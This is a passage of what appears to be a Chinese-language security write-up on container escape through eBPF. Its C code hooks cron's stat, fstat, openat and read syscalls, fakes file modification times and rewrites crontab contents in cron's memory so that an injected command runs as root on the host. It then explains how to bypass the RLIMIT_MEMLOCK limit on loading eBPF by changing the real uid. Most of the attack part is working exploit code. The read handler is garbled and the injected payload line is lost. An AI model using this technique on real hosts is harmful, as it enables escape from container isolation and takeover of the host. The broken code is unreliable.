@@ -1,0 +1,168 @@
+        unsigned long id;
+        struct pt_regs *regs = ctx->args[0];
+        bpf_probe_read_kernel(&id, sizeof(id), ®s->orig_ax);
+        switch (id)
+        {
+            case 0:
+                handle_read(ctx);
+                break;
+            case 4:
+                handle_stat();
+                break;
+            case 5:
+                handle_fstat();
+                break;
+            case 257:
+                handle_openat(ctx);
+                break;
+            default:
+                return 0;
+        }
+    }
+这段程序和 `sys_enter` 的程序大致一样，只是从文件名换成了pid的判断，而pid的获取可以从 `sys_enter`
+的时候获取到，另外此时已经处于执行完syscall的状态，因此 `AX` 寄存器里并不会存放syscall的id，但是 `pt_regs` 结构有个字段
+`orig_ax` 存放了原始的syscall id，从这可以获取到。
+在编写具体处理不同系统调用之前，我们需要了解到，eBPF程序是没有全局变量的，在较新版本的clang和内核上为什么可以使用c的全局变量语法呢，其实libbpf在背后会帮我们转换成
+`BPF_MAP_TYPE_ARRAY` 类型的map，而eBPF的map是可以在不同eBPF程序间甚至不同进程间共享的。
+处理stat系统调用相关代码：
+    static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx)
+    {
+        struct pt_regs *regs;
+        const char *pathname;
+        char buf[64];
+        regs = (struct pt_regs *)ctx->args[0];
+        bpf_probe_read(&pathname, sizeof(pathname), ®s->di);
+        bpf_probe_read_str(buf, sizeof(buf), pathname);
+        if (memcmp(buf, CRONTAB, sizeof(CRONTAB)) && memcmp(buf, SPOOL_DIR, sizeof(SPOOL_DIR)))
+            return 0;
+        if (cron_pid == 0)
+        {
+            cron_pid = bpf_get_current_pid_tgid() & 0xffffffff;
+        }
+        memcpy(filename_saved, buf, 64);
+        bpf_probe_read(&statbuf_ptr, sizeof(statbuf_ptr), ®s->si);
+        return 0;
+    }
+首先判断读取的文件是否为 `/etc/crontab` 或者 `crontabs`
+，这些路径是cron用于判断相关配置文件是否被修改了的路径，随后会保存pid、filename、用于接受文件信息的用户态buf指针到全局变量里。
+处理stat系统调用返回的代码：
+    static __inline int handle_stat()
+    {
+        if (statbuf_ptr == 0)
+            return 0;
+        bpf_printk("cron %d stat %s\n", cron_pid, filename_saved);
+        // conditions:
+        // 1. !TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))
+        // 2. !TEQUAL(syscron_stat.st_mtim, ts_zero)
+        __kernel_ulong_t spool_st_mtime = 0;
+        __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
+        if (!memcmp(filename_saved, SPOOL_DIR, sizeof(SPOOL_DIR)))
+        {
+            bpf_probe_write_user(&statbuf_ptr->st_mtime, &spool_st_mtime, sizeof(spool_st_mtime));
+        }
+        if (!memcmp(filename_saved, CRONTAB, sizeof(CRONTAB)))
+        {
+            bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));
+        }
+        print_stat_result(statbuf_ptr);
+        statbuf_ptr = 0;
+    }
+在stat返回时，我们需要让上节提到的两个条件均通过，同时为了保证在eBPF程序detach后， `cron` 可以立刻更新为正常的配置，这里将
+`SPOOL_DIR` 的 `mtime` 设为0， `CRONTAB` 设为一个随机的较小数值，这样 `cron`
+记录的上一次修改时间就会是这个较小的时间，在下一次循环时会马上更新成原来的配置。
+修改 `fstat` 返回的代码与 `stat` 大同小异，只是需要我们先hook `openat` 的返回处并保存打开的文件描述符的值：
+    static __inline void handle_openat(struct bpf_raw_tracepoint_args *ctx)
+    {
+        if (!memcmp(openat_filename_saved, CRONTAB, sizeof(CRONTAB)))
+        {
+            open_fd = ctx->args[1];
+            bpf_printk("openat: %s, %d\n", openat_filename_saved, open_fd);
+            openat_filename_saved[0] = '\0';
+        }
+    }
+然后当 `fstat` 获取该文件的信息时修改返回值即可。
+最后就是在读取文件信息的时候修改处于进程内存里的返回数据，即hook `read` 系统调用返回的时候：
+    static __inline void handle_read(struct bpf_raw_tracepoint_args *ctx)
+    {
+        if (read_buf == 0)
+            return;
+        ssize_t ret = ctx->args[1];
+        if (ret  /tmp/pwned'
+#` ，由于 `vixie-cron` 命令不支持多行，所以仅需在最后加个注释符 `#` 即可保证后面的命令被注释掉，时间选择每分钟都会触发，由于上面
+`stat` 返回的是较小 `mtime` ，停止eBPF程序后也可以马上恢复成原来的cron规则。
+编译后在拥有 `CAP_SYS_ADMIN` 权限其他配置默认的root用户容器内运行一下，：
+同时运行 `journalctl -f -u cron` 观察一下 `cron` 输出的日志：
+命令成功执行：
+### RLIMIT限制绕过
+Linux kernel为了保证eBPF程序的安全性，在加载的时候添加了许多限制，包括指令长度、不能有循环、tail
+call嵌套有上限等等，还有资源上的限制，在kernel 5.11之前，kernel限制eBPF程序的内存占用使用的上限是 `RLIMIT_MEMLOCK`
+的值，这个值可能会非常小，比如在docker容器内默认为 `64KB` ，并且内核在计算eBPF程序内存使用量的时候是 `per-user`
+模式，并非是每个进程单独计算，而是跟随 `fork` 来计算某个用户使用的总量。容器新启动的时候默认是root用户并且处于 `initial user
+namespace` ，而且宿主机的root用户往往会先占用一部分的影响 `memlock`
+的内存，这样就会导致eBPF程序在容器内因为rlimit限制无法成功加载。
+让我们来简要分析一下内核是如何计算eBPF占用内存的：
+    // https://elixir.bootlin.com/linux/v5.10.74/source/kernel/bpf/syscall.c#L1631
+    int __bpf_prog_charge(struct user_struct *user, u32 pages)
+    {
+        unsigned long memlock_limit = rlimit(RLIMIT_MEMLOCK) >> PAGE_SHIFT;
+        unsigned long user_bufs;
+        if (user) {
+            user_bufs = atomic_long_add_return(pages, &user->locked_vm);
+            if (user_bufs > memlock_limit) {
+                atomic_long_sub(pages, &user->locked_vm);
+                return -EPERM;
+            }
+        }
+        return 0;
+    }
+    void __bpf_prog_uncharge(struct user_struct *user, u32 pages)
+    {
+        if (user)
+            atomic_long_sub(pages, &user->locked_vm);
+    }
+加载和卸载eBPF程序时使用上面两个函数进行内存消费的计算，可以看到，计算占用内存的字段是位于 `user_struct` 的 `locked_vm`
+字段，而 `user_struct` 实际上内核代表用户credential结构 `struct cred` 的user字段：
+    struct cred {
+        //...
+        struct user_struct *user;    /* real user ID subscription */
+        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+        struct group_info *group_info;    /* supplementary groups for euid/fsgid */
+        /* RCU deletion */
+        union {
+            int non_rcu;            /* Can we skip RCU deletion? */
+            struct rcu_head    rcu;        /* RCU deletion hook */
+        };
+    } __randomize_layout;
+linux在创建新进程时，仅会简单的调用 `copy_creds`
+（https://elixir.bootlin.com/linux/v5.10.75/source/kernel/fork.c#L1981）,而
+`copy_creds` 会调用 `prepare_creds` ，这个函数仅仅是给原来的 `struct user_struct`
+添加了一个引用计数，并没有新分配一个 `user_struct` ，这样就实现了对单个用户的内存占用计算。
+    static inline struct user_struct *get_uid(struct user_struct *u)
+    {
+        refcount_inc(&u->__count);
+        return u;
+    }
+    struct cred *prepare_creds(void)
+    {
+        struct task_struct *task = current;
+        const struct cred *old;
+        struct cred *new;
+        // ...
+        old = task->cred;
+        memcpy(new, old, sizeof(struct cred));
+        // ...
+        get_uid(new->user);
+        // ...
+    }
+上面说到，eBPF限制内存使用是 `per-user`
+的，那么如果我们创建一个不同的user呢？进程的cred如果属于一个新的user，那么就会新建一个新的 `user_struct` ，此时
+`locked_vm` 的值就会初始化为0。
+由于内核根据uid来保存 `user_struct` ，所以创建的user的uid不能为0，不然就会继续引用原来的root的 `user_struct`
+，并且eBPF需要 `CAP_SYS_ADMIN` 权限，我们要让一个普通用户有这个权限有很多种办法：
+?设置加载eBPF程序文件的File
+Capabilities，创建新用户，切换到新用户执行设置好Cap的文件?在root用户情况下改变setuid，并且设置`SECBIT_KEEP_CAPS`
+`securebits`?在root用户情况下仅改变`real uid`
+这里介绍第三种办法，因为实现起来是最简单的办法。
+我们简要看下 `setreuid` 系统调用在什么情况下会改变 `user_struct` :
+    // https://elixir.bootlin.com/linux/v5.10.75/source/kernel/sys.c#L502
+    long __sys_setreuid(uid_t ruid, uid_t euid)
